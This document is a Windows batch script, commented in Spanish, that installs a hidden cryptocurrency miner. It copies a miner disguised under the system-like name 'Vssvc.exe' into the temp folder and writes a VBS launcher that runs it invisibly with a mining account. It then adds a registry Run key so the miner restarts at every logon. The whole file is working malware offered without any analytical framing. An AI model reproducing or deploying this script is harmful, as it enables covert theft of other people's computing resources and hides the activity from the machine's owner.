@ECHO OFF
SET home="%TEMP%\linoone"
MKDIR %home%
START Taskmgr.exe
rem crea wLauncher para ejecutar el minero (y es ejecutado por login)
ECHO set objshell = createobject("wscript.shell") > %home%\wLauncher.vbs
ECHO objshell.run "Vssvc.exe -u deeelujoo@gmail.com --bcn 2",vbhide >> %home%\wLauncher.vbs
rem copia los archivos del minero
COPY "Vssvc.exe" "%home%"
COPY "OpenCL.dll" "%home%"
rem crea login
ECHO @ECHO OFF > %home%\login.cmd
ECHO TITLE %COMPUTERNAME% >> %home%\login.cmd
REM ECHO ECHO LOG: %%TIME%%T%%DATE%% ^>^> %home%\reg.txt >> %home%\login.cmd
ECHO CD %home% >> %home%\login.cmd
ECHO START wLauncher.vbs >> %home%\login.cmd
ECHO EXIT >> %home%\login.cmd
rem registra login para ejecutar en los inicios
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Linoone /t REG_SZ /d "%home%\login.cmd" -f
rem ejecuta login al intalarse por primera vez
START %TEMP%\linoone\login.cmd
EXIT